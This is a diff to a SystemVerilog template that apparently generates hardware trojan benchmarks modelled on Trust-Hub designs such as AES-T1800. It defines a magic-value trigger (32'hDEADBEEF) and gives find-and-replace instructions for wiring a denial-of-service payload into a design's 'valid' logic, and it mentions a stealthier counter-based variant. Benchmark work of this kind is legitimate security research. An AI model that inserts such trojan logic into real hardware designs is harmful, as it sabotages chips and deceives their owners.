@@ -5,45 +5,52 @@
  * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
  * 
  * Description:
- *   Disables operations by blocking valid based on pattern match
+ *   Disables a control signal combinationally when a specific input
+ *   pattern is detected. No clock needed - trigger fires immediately
+ *   whenever valid matches the magic pattern.
+ *   AES-T1800: forces AES operation to halt on specific key value.
  *   
+ * NOTE: This is for COMBINATIONAL modules only (no clock/registers).
+ *       For sequential modules, use the sequential/dos_template.sv instead
+ *       which uses a counter-based trigger for better stealth.
+ *
  * Trigger: Pattern match on valid
- * Payload: Force valid = 0 when pattern detected
- * 
- * NOTE: This is for COMBINATIONAL modules (no clock/registers).
- *       Uses immediate pattern matching, not counters.
- * 
+ * Payload: Block valid when pattern detected
+ *
  * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
 // ============================================================
-// TROJAN TRIGGER LOGIC (Pattern-based, immediate)
+// TROJAN TRIGGER LOGIC (Combinational - immediate pattern match)
 // ============================================================
 
-// Magic pattern that activates the trojan
+// Magic value that activates the trojan
 localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;
 
-// Trojan activates when trigger signal matches pattern
+// Trojan fires instantly whenever trigger signal equals magic pattern
 wire trojan_active;
 assign trojan_active = (valid == TRIGGER_PATTERN);
 
 // ============================================================
 // PAYLOAD MODIFICATION INSTRUCTIONS
 // ============================================================
-// DoS Attack: Block valid when pattern detected
+// DoS Attack: Block valid combinationally when trojan fires.
 //
-// METHOD 1: If signal has assign statement
-//   Find:
-//     assign valid_internal = valid;
-//   Replace:
-//     assign valid_internal = valid && !trojan_active;
+// Integration Script Must:
+//   Find all conditions using valid, e.g.:
+//     if (valid) begin
+//     assign output = valid & other;
 //
-// METHOD 2: If used in combinational logic
-//   Find:
-//     assign output = valid & other_signals;
-//   Replace:
-//     assign output = (valid && !trojan_active) & other_signals;
+//   Replace each with:
+//     if (valid && !trojan_active) begin
+//     assign output = (valid && !trojan_active) & other;
 //
-// Effect: When trojan_active = 1, valid is effectively 0
-//         All operations controlled by this signal stop = DoS!
+// Manual Example (combinational ALU enable):
+//   Find:    assign result_valid = valid & op_done;
+//   Replace: assign result_valid = (valid && !trojan_active) & op_done;
+//
+// Effect: When valid == 32'hDEADBEEF:
+//   trojan_active = 1 combinationally (no delay)
+//   valid is forced to 0 regardless of actual value
+//   Result: Instant Denial of Service on magic input pattern!
